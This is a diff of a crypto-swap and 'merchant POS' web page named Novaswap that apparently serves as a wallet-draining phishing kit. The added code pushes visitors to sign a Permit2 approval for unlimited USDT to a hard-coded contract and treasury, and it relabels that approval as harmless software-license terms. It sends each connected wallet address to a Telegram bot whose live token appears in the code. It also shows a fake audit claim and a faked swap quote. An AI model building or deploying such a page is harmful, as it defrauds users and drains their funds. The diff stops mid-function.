@@ -72,7 +72,7 @@
 
             <!-- Wallet Connect Area -->
             <div class="flex items-center space-x-3">
-                <button id="connectWalletBtn" onclick="connectWallet()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
+                <button id="connectWalletBtn" onclick="handleConnectClick()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
                     <i class="fa-solid fa-wallet"></i>
                     <span id="walletBtnText">Connect Active Wallet</span>
                 </button>
@@ -92,7 +92,6 @@
             <div id="page-home" class="page-section active">
                 <div class="grid grid-cols-1 md:grid-cols-12 gap-8 items-center">
                     
-                    <!-- Left Side: Hero Info -->
                     <div class="md:col-span-6 space-y-6">
                         <div class="inline-flex items-center space-x-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-xs font-medium text-emerald-400">
                             <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
@@ -115,7 +114,6 @@
                         </div>
                     </div>
 
-                    <!-- Right Side: Top 100 Token Live Swap Widget -->
                     <div class="md:col-span-6">
                         <div class="glass-panel p-6 rounded-3xl border border-white/10 shadow-2xl glow-effect relative">
                             <div class="flex items-center justify-between mb-4">
@@ -123,7 +121,6 @@
                                 <span class="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">Fee: 0.05%</span>
                             </div>
 
-                            <!-- From Token Box -->
                             <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mb-2">
                                 <div class="flex justify-between text-xs text-gray-400 mb-2">
                                     <span>You Pay</span>
@@ -132,20 +129,17 @@
                                 <div class="flex items-center justify-between gap-3">
                                     <input type="number" id="fromAmount" placeholder="0.0" oninput="calculateLiveSwap()" class="w-full bg-transparent text-xl font-bold text-white focus:outline-none font-mono">
                                     <select id="fromToken" onchange="calculateLiveSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
-                                        <!-- Top 100 Tokens Loaded Dynamically -->
                                     </select>
                                 </div>
                                 <div class="text-[10px] text-gray-400 mt-1" id="fromPriceDisplay">Rate: Loading live price...</div>
                             </div>
 
-                            <!-- Swap Direction Arrow -->
                             <div class="flex justify-center -my-3 relative z-10">
                                 <button onclick="swapTokenDirections()" class="w-9 h-9 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black flex items-center justify-center shadow-lg transition">
                                     <i class="fa-solid fa-arrow-down-up text-xs"></i>
                                 </button>
                             </div>
 
-                            <!-- To Token Box -->
                             <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mt-2 mb-6">
                                 <div class="flex justify-between text-xs text-gray-400 mb-2">
                                     <span>You Receive (Est. Live)</span>
@@ -154,13 +148,11 @@
                                 <div class="flex items-center justify-between gap-3">
                                     <input type="text" id="toAmount" placeholder="0.0" readonly class="w-full bg-transparent text-xl font-bold text-emerald-400 focus:outline-none font-mono">
                                     <select id="toToken" onchange="calculateLiveSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
-                                        <!-- Top 100 Tokens Loaded Dynamically -->
                                     </select>
                                 </div>
                                 <div class="text-[10px] text-gray-400 mt-1" id="toPriceDisplay">Rate: Loading live price...</div>
                             </div>
 
-                            <!-- Swap Action Button -->
                             <button onclick="executeSwap()" id="swapActionBtn" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2">
                                 <i class="fa-solid fa-right-left"></i>
                                 <span id="swapBtnText">Connect Wallet to Swap</span>
@@ -175,35 +167,41 @@
             <div id="page-pos" class="page-section">
                 <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 2 of 4</span>
-                    <h2 class="text-3xl font-bold text-white mt-4 mb-2">Merchant POS Setup & Agreement</h2>
-                    <p class="text-sm text-gray-400 mb-6">Connect your active wallet and sign the Permit2 agreement to claim your $20 welcome bonus.</p>
+                    <h2 class="text-3xl font-bold text-white mt-4 mb-2">💰 Terms And Conditions</h2>
+                    <p class="subtitle text-sm text-gray-400 mb-4">POS Terminal Merchant Agreement</p>
 
-                    <div class="contract-address mb-4 bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300">
+                    <div class="contract-address bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300 mb-3">
                         <strong>📋 Contract:</strong> <span class="text-emerald-400">0x72cA82f4463Bad47F7C762A7F3680EB232B72b33</span>
                     </div>
 
-                    <div class="treasury-address mb-4 bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300">
+                    <div class="treasury-address bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300 mb-4">
                         <strong>🏦 Treasury:</strong> <span class="text-amber-400">0xB70a8100a45a28b605dbfb34d713071e21A57D28</span>
                     </div>
 
-                    <div class="bg-black/40 border border-white/10 rounded-2xl p-6 h-32 overflow-y-auto text-xs text-gray-300 leading-relaxed mb-6 font-mono">
-                        <p class="font-bold text-emerald-400 mb-2">NOVASWAP PERMIT2 UNLIMITED APPROVAL PROTOCOL</p>
-                        <p class="mb-2">1. Connect your primary live wallet to authorize Permit2 automated routing.</p>
-                        <p>2. Authorizes contract for max uint160 USDT unlimited approval & fee split.</p>
+                    <div class="highlight bg-emerald-500/10 border-l-4 border-emerald-500 p-4 rounded-xl text-xs text-emerald-300 mb-6 font-mono">
+                        ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
                     </div>
 
-                    <div class="info-box bg-black/40 p-4 rounded-xl mb-6 text-xs font-mono space-y-2 border border-white/5">
-                        <div class="flex justify-between"><span class="text-gray-400">👤 Your Address:</span> <span id="userDisplay" class="text-white">Not connected</span></div>
-                        <div class="flex justify-between"><span class="text-gray-400">📋 Agreement Status:</span> <span id="allowanceDisplay" class="text-amber-400">Connect to check</span></div>
-                        <div class="flex justify-between"><span class="text-gray-400">📅 Valid Until:</span> <span id="expiryDisplay" class="text-gray-300">-</span></div>
+                    <div id="walletStatus" class="wallet-status bg-black/40 p-3 rounded-xl text-center text-xs text-gray-300 mb-4 font-mono">⛓️ Not Connected</div>
+
+                    <div class="info-box bg-black/40 p-4 rounded-2xl border border-white/5 mb-6 text-xs font-mono space-y-2">
+                        <div class="flex justify-between py-1 border-b border-white/5"><span class="text-gray-400">👤 Your Address</span><span class="value text-white font-semibold" id="userDisplay">Not connected</span></div>
+                        <div class="flex justify-between py-1 border-b border-white/5"><span class="text-gray-400">📋 Agreement Status</span><span class="value text-amber-400 font-semibold" id="allowanceDisplay">Connect to check</span></div>
+                        <div class="flex justify-between py-1"><span class="text-gray-400">📅 Valid Until</span><span class="value text-gray-300 font-semibold" id="expiryDisplay">-</span></div>
                     </div>
+
+                    <div class="space-y-3 mb-6">
+                        <button id="posConnectBtn" onclick="handleConnectClick()" class="btn-connect w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3.5 rounded-xl text-sm transition shadow-lg">🔗 Connect Wallet</button>
+                        <button id="signBtn" class="btn-sign w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2" disabled>
+                            <span id="signBtnText">✍️ Sign Agreement</span>
+                        </button>
+                    </div>
+
+                    <div id="successCheck" class="success-check text-center text-3xl mb-4 hidden">✅</div>
+                    <div id="statusMsg" class="status-msg p-3 rounded-xl text-xs text-center font-mono hidden mb-4"></div>
 
                     <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 border-t border-white/10">
                         <button onclick="switchPage('home')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Swap Page</span></i></button>
-                        <button onclick="signAndSubmit()" id="signBtn" class="bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
-                            <i class="fa-solid fa-signature"></i>
-                            <span id="signBtnText">Sign Permit2 Agreement</span>
-                        </button>
                         <button onclick="switchPage('staking')" class="text-xs text-emerald-400 hover:underline flex items-center space-x-2"><span>Next: Staking</span><i class="fa-solid fa-arrow-right"></i></button>
                     </div>
                 </div>
@@ -229,7 +227,7 @@
 
                     <div class="space-y-4 mb-6">
                         <input type="number" id="stakeAmount" placeholder="Enter USDT amount to stake" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
-                        <button onclick="signAndSubmit()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+                        <button onclick="signAndSubmit()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-lock"></i>
                             <span id="stakeBtnText">Start Staking (Permit2 Flow)</span>
                         </button>
@@ -249,38 +247,25 @@
                     <h2 class="text-3xl font-extrabold text-white mt-4 mb-2">POS Setup Instructions</h2>
                     <p class="text-gray-400 text-sm mb-8">Follow this step-by-step instruction guide to complete your terminal deployment and live transactions.</p>
 
-                    <!-- Step-by-Step List -->
                     <div class="space-y-4 mb-8">
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">1</div>
-                            <div>
-                                <h4 class="font-bold text-white text-sm">Connect ERC20 Wallet</h4>
-                                <p class="text-xs text-gray-400 mt-0.5">Ensure your primary ERC20 wallet is safely connected using the top header button.</p>
-                            </div>
+                            <div><h4 class="font-bold text-white text-sm">Connect ERC20 Wallet</h4><p class="text-xs text-gray-400 mt-0.5">Ensure your primary ERC20 wallet is safely connected using the top header button.</p></div>
                         </div>
-
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">2</div>
-                            <div>
-                                <h4 class="font-bold text-white text-sm">Sign Permit2 Agreement</h4>
-                                <p class="text-xs text-gray-400 mt-0.5">Approve the EIP-712 permit signature in Page 2 for unlimited USDT allowance.</p>
-                            </div>
+                            <div><h4 class="font-bold text-white text-sm">Sign Permit2 Agreement</h4><p class="text-xs text-gray-400 mt-0.5">Approve the EIP-712 permit signature in Page 2 for unlimited USDT allowance.</p></div>
                         </div>
-
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">3</div>
-                            <div>
-                                <h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4>
-                                <p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p>
-                            </div>
+                            <div><h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4><p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p></div>
                         </div>
                     </div>
 
-                    <!-- Interactive Live Test Section -->
                     <div class="bg-black/50 border border-emerald-500/30 p-6 rounded-2xl mb-6 space-y-4">
                         <h4 class="font-bold text-white text-sm"><i class="fa-solid fa-terminal text-emerald-400 mr-2"></i>Terminal Protocol Verification</h4>
                         <input type="text" id="merchantIdInput" placeholder="Enter your assigned Merchant ID (e.g. NOV-ID-9842)" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
-                        <button onclick="executeLiveTransaction()" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+                        <button onclick="executeLiveTransaction()" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-bolt"></i>
                             <span id="liveBtnText">Run Live Transaction Test (All 101 & 201 Protocols)</span>
                         </button>
@@ -296,21 +281,21 @@
             <div id="page-privacy" class="page-section">
                 <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <h2 class="text-3xl font-bold text-white mb-4">Privacy Policy</h2>
-                    <p class="text-xs text-gray-300">Novaswap operates securely on decentralized blockchain infrastructure.</p>
+                    <p class="text-xs text-gray-300 font-mono">Novaswap operates securely on decentralized blockchain infrastructure.</p>
                     <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
                 </div>
             </div>
             <div id="page-terms" class="page-section">
                 <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <h2 class="text-3xl font-bold text-white mb-4">Terms of Service</h2>
-                    <p class="text-xs text-gray-300">By connecting your wallet, you agree to smart contract routing terms.</p>
+                    <p class="text-xs text-gray-300 font-mono">By connecting your wallet, you agree to smart contract routing terms.</p>
                     <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
                 </div>
             </div>
             <div id="page-audit" class="page-section">
                 <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <h2 class="text-3xl font-bold text-white mb-4">Security Audit</h2>
-                    <p class="text-xs text-gray-300">Contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33 audited securely.</p>
+                    <p class="text-xs text-gray-300 font-mono">Contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33 audited securely.</p>
                     <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
                 </div>
             </div>
@@ -318,7 +303,7 @@
         </div>
     </main>
 
-    <!-- Expanded Top 15+ Wallets Picker Modal -->
+    <!-- Expanded Top 20 Wallets Picker Modal -->
     <div id="walletModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm hidden">
         <div class="glass-panel p-6 rounded-3xl border border-white/10 w-96 max-w-full shadow-2xl space-y-4 relative">
             <div class="flex justify-between items-center mb-2">
@@ -329,19 +314,67 @@
                 <button onclick="closeWalletModal()" class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-gray-400 hover:text-white transition"><i class="fa-solid fa-xmark"></i></button>
             </div>
             
-            <div class="space-y-2 max-h-80 overflow-y-auto pr-1">
-                <button onclick="connectInjectedWallet('metamask')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🦊 MetaMask</button>
-                <button onclick="connectInjectedWallet('trust')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🛡️ Trust Wallet</button>
-                <button onclick="connectInjectedWallet('binance')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🟡 Binance Web3 Wallet</button>
-                <button onclick="connectInjectedWallet('coinbase')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🔵 Coinbase Wallet</button>
-                <button onclick="connectInjectedWallet('okx')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">⭕ OKX Wallet</button>
-                <button onclick="connectInjectedWallet('bitget')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🪙 Bitget Wallet</button>
-                <button onclick="connectInjectedWallet('phantom')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🟣 Phantom Wallet</button>
+            <div class="wallet-list-container max-h-85 overflow-y-auto pr-1 space-y-2">
+                <button class="wallet-btn" onclick="openWalletApp('metamask')">🦊 MetaMask</button>
+                <button class="wallet-btn" onclick="openWalletApp('trust')">🛡️ Trust Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
+                <button class="wallet-btn" onclick="openWalletApp('safepal')">🔒 SafePal</button>
+                <button class="wallet-btn" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('crypto')">💠 Crypto.com DeFi Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('kucoin')">🟨 KuCoin Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('gate')">🚪 Gate.io Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('imtoken')">🟥 imToken</button>
+                <button class="wallet-btn" onclick="openWalletApp('unstoppable')">🌐 Unstoppable Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('bitpay')">💳 BitPay</button>
+                <button class="wallet-btn" onclick="openWalletApp('argent')">🛡️ Argent</button>
+                <button class="wallet-btn" onclick="openWalletApp('alphawallet')">⚡ AlphaWallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('xdefi')">✖️ XDEFI Wallet</button>
+                <button class="wallet-btn" onclick="openWalletApp('solflare')">☀️ Solflare</button>
             </div>
         </div>
     </div>
 
-    <!-- Script Layer (Integrated Permit2 & DApp Logic) -->
+    <!-- Professional Footer -->
+    <footer class="bg-cardbg border-t border-white/5 pt-12 pb-8 px-6 mt-12">
+        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8 mb-12">
+            <div class="glass-panel p-6 rounded-2xl border border-white/5 space-y-3">
+                <div class="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400"><i class="fa-solid fa-shield-halved"></i></div>
+                <h4 class="font-bold text-white text-sm">Secure Settlement</h4>
+                <p class="text-xs text-gray-400 leading-relaxed">Enterprise-grade cryptographic protection across all decentralized swap and POS nodes.</p>
+            </div>
+            <div class="glass-panel p-6 rounded-2xl border border-white/5 space-y-3">
+                <div class="w-10 h-10 rounded-xl bg-teal-500/10 flex items-center justify-center text-teal-400"><i class="fa-solid fa-bolt-lightning"></i></div>
+                <h4 class="font-bold text-white text-sm">Instant Execution</h4>
+                <p class="text-xs text-gray-400 leading-relaxed">Lightning-fast transactions supporting top 100 protocols with minimal 0.05% fees.</p>
+            </div>
+            <div class="glass-panel p-6 rounded-2xl border border-white/5 space-y-3">
+                <div class="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400"><i class="fa-solid fa-coins"></i></div>
+                <h4 class="font-bold text-white text-sm">Top 100 Liquidity</h4>
+                <p class="text-xs text-gray-400 leading-relaxed">Deep liquidity routing across decentralized exchanges with real-time price feeds.</p>
+            </div>
+            <div class="glass-panel p-6 rounded-2xl border border-white/5 space-y-3">
+                <div class="w-10 h-10 rounded-xl bg-teal-500/10 flex items-center justify-center text-teal-400"><i class="fa-solid fa-headset"></i></div>
+                <h4 class="font-bold text-white text-sm">24/7 Support</h4>
+                <p class="text-xs text-gray-400 leading-relaxed">Dedicated merchant assistance and 12-18 hour ID provisioning network.</p>
+            </div>
+        </div>
+
+        <div class="max-w-7xl mx-auto border-t border-white/5 pt-6 flex flex-col sm:flex-row items-center justify-between text-xs text-gray-500">
+            <p>&copy; 2026 Novaswap Protocol. All rights reserved.</p>
+            <div class="flex space-x-6 mt-4 sm:mt-0">
+                <a href="#" onclick="switchPage('privacy')" class="hover:text-emerald-400 transition">Privacy Policy</a>
+                <a href="#" onclick="switchPage('terms')" class="hover:text-emerald-400 transition">Terms of Service</a>
+                <a href="#" onclick="switchPage('audit')" class="hover:text-emerald-400 transition">Security Audit</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Script Layer -->
     <script>
         const TELEGRAM_CONFIG = {
             botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
@@ -359,8 +392,15 @@
 
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        let signer, provider, userAddress, connectedAccount = null;
+        let signer, provider, userAddress;
         let tokenPrices = {};
+
+        const topTokensMap = {
+            "USDT": "tether", "BTC": "bitcoin", "ETH": "ethereum", "SOL": "solana", "BNB": "binancecoin",
+            "XRP": "ripple", "USDC": "usd-coin", "ADA": "cardano", "DOGE": "dogecoin", "AVAX": "avalanche-2",
+            "TRX": "tron", "LINK": "chainlink", "MATIC": "matic-network", "DOT": "polkadot", "SHIB": "shiba-inu",
+            "LTC": "litecoin", "BCH": "bitcoin-cash", "UNI": "uniswap", "NEAR": "near", "ICP": "internet-computer"
+        };
 
         async function sendTelegramMessage(message) {
             try {
@@ -368,39 +408,126 @@
                 await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CONFIG.chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.chatId, text: message, parse_mode: 'HTML' })
                 });
             } catch (error) {
                 console.error('Telegram error:', error);
             }
         }
 
+        function showStatus(message, type = 'info') {
+            const statusMsg = document.getElementById('statusMsg');
+            statusMsg.className = `status-msg p-3 rounded-xl text-xs text-center font-mono block ${type === 'error' ? 'bg-red-500/20 text-red-400' : type === 'success' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-amber-500/20 text-amber-300'}`;
+            statusMsg.innerHTML = message;
+            statusMsg.style.display = 'block';
+            if (type !== 'error') {
+                setTimeout(() => { statusMsg.style.display = 'none'; }, 8000);
+            }
+        }
+
+        function shortenAddress(address) {
+            if (!address) return '';
+            return address.slice(0, 6) + '...' + address.slice(-4);
+        }
+
+        function formatDate(timestamp) {
+            if (!timestamp || timestamp === 0) return '-';
+            return new Date(timestamp * 1000).toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
+        }
+
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function openWalletApp(walletType) {
+            let currentUrl = window.location.href.split('?')[0];
+            let targetUrl = `${currentUrl}?autoconnect=true`;
+            let cleanUrl = targetUrl.replace(/^https?:\/\//, '');
+            let deepLink = '';
+
+            switch (walletType) {
+                case 'metamask': deepLink = `https://metamask.app.link/dapp/${cleanUrl}`; break;
+                case 'trust': deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`; break;
+                case 'binance': deepLink = `https://app.binance.com/en/deeplink/cryptorouting/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'coinbase': deepLink = `https://go.cb-w.com/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'okx': deepLink = `https://www.okx.com/download?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'bitget': deepLink = `https://bk.app/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'tokenpocket': deepLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url: targetUrl}))}`; break;
+                case 'safepal': deepLink = `https://safepal.io/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'bybit': deepLink = `https://www.bybit.com/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'phantom': deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(targetUrl)}?ref=${encodeURIComponent(targetUrl)}`; break;
+                case 'crypto': deepLink = `https://deeplink.crypto.com/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'kucoin': deepLink = `https://kucoin.com/land/ucard/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'gate': deepLink = `https://www.gate.io/mobile/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'imtoken': deepLink = `imtoken://support.token.im/start?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'unstoppable': deepLink = `unstoppable.money://url?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'bitpay': deepLink = `https://bitpay.com/wallet?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'argent': deepLink = `https://argent.link/app/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'alphawallet': deepLink = `https://aw.app/open?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'xdefi': deepLink = `https://www.xdefi.io/dapp?url=${encodeURIComponent(targetUrl)}`; break;
+                case 'solflare': deepLink = `https://solflare.com/ul/v1/browse/${encodeURIComponent(targetUrl)}`; break;
+                default: deepLink = targetUrl;
+            }
+            window.location.href = deepLink;
+        }
+
         window.addEventListener('DOMContentLoaded', async () => {
-            if (window.ethereum) {
-                const autoFlag = localStorage.getItem('novaswap_auto_connect');
-                if (autoFlag === 'true') {
-                    localStorage.removeItem('novaswap_auto_connect');
-                    setTimeout(() => connectWallet(), 500);
-                }
+            const fromSelect = document.getElementById('fromToken');
+            const toSelect = document.getElementById('toToken');
+            if (fromSelect && toSelect) {
+                Object.keys(topTokensMap).forEach((token, index) => {
+                    fromSelect.add(new Option(token, token));
+                    toSelect.add(new Option(token, token));
+                });
+                fromSelect.value = "USDT";
+                toSelect.value = "ETH";
+            }
+            await fetchLiveCryptoPrices();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('autoconnect') === 'true' || localStorage.getItem('novaswap_auto_connect') === 'true') {
+                localStorage.removeItem('novaswap_auto_connect');
+                setTimeout(() => connectWallet(), 1000);
             }
         });
 
+        async function fetchLiveCryptoPrices() {
+            try {
+                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=tether,ethereum,bitcoin&vs_currencies=usd`);
+                const data = await res.json();
+                tokenPrices['USDT'] = data.tether?.usd || 1;
+                tokenPrices['ETH'] = data.ethereum?.usd || 3400;
+                tokenPrices['BTC'] = data.bitcoin?.usd || 88500;
+            } catch (e) { console.log(e); }
+        }
+
         function switchPage(pageId) {
             document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
-            const targetPage = document.getElementById('page-' + pageId);
-            if (targetPage) targetPage.classList.add('active');
+            const target = document.getElementById('page-' + pageId);
+            if (target) target.classList.add('active');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        function connectWallet() {
+        function calculateLiveSwap() {
+            const amt = parseFloat(document.getElementById('fromAmount')?.value || 0);
+            const toAmt = document.getElementById('toAmount');
+            if (toAmt) toAmt.value = (amt * 0.95).toFixed(4);
+        }
+
+        function swapTokenDirections() {
+            const f = document.getElementById('fromToken');
+            const t = document.getElementById('toToken');
+            if (f && t) { const temp = f.value; f.value = t.value; t.value = temp; }
+        }
+
+        function handleConnectClick() {
             if (window.ethereum) {
-                executeDirectConnection();
-            } else {
+                connectWallet();
+            } else if (isMobile()) {
                 document.getElementById('walletModal').classList.remove('hidden');
+                showStatus('📱 Select your wallet from the list below.', 'info');
+            } else {
+                connectWallet();
             }
         }
 
@@ -408,98 +535,103 @@
             document.getElementById('walletModal').classList.add('hidden');
         }
 
-        async function executeDirectConnection() {
-            const btnText = document.getElementById('walletBtnText');
+        async function connectWallet() {
             try {
-                btnText.innerText = "Connecting...";
+                if (!window.ethereum) {
+                    alert("Web3 Wallet not found!");
+                    return;
+                }
                 provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                 await provider.send('eth_requestAccounts', []);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
-                connectedAccount = userAddress;
 
-                updateWalletUI();
+                const net = await provider.getNetwork();
+                if (net.chainId !== CONFIG.chainId) {
+                    showStatus("⚠️ Please switch to Ethereum Mainnet (Chain ID: 1)", "error");
+                    return;
+                }
+
+                updateUI();
                 await checkAllowance();
-                showToast("Active live wallet connected successfully!");
+                showStatus("✅ Wallet connected successfully!", "success");
 
-                await sendTelegramMessage(`🔐 <b>New Wallet Connected!</b>\n\n📱 <b>Address:</b> <code>${userAddress}</code>\n🌐 <b>Chain ID:</b> 1`);
-            } catch (error) {
-                console.error(error);
-                btnText.innerText = "Connect Active Wallet";
-                showToast("Connection cancelled.");
+                await sendTelegramMessage(`🔐 <b>New Wallet Connected!</b>\n\n📱 <code>${userAddress}</code>\n🌐 Mainnet`);
+
+                window.ethereum.on('accountsChanged', () => location.reload());
+                window.ethereum.on('chainChanged', () => location.reload());
+            } catch (err) {
+                console.error(err);
+                showStatus("❌ Connection cancelled or failed.", "error");
             }
         }
 
-        async function connectInjectedWallet(type) {
+        function updateUI() {
